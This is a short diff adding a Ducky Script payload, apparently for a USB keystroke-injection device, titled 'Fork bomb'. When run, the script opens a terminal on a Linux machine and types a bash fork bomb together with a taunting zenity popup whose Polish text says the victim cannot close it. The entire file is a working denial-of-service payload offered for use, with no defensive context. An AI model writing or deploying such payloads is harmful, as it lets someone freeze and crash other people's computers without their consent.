@@ -1,0 +1,9 @@
+REM TITLE Fork bomb
+REM AUTHOR mrLeonTheMaster
+REM DESCRIPTION Runs a fork bomb on a linux pc.
+
+CTRL-ALT t
+DELAY 1000
+STRING :(){ :|:& };: && zenity --error --text="Nie zamkniesz mnie!" --title="HAHAHA" & exit
+ENTER
+
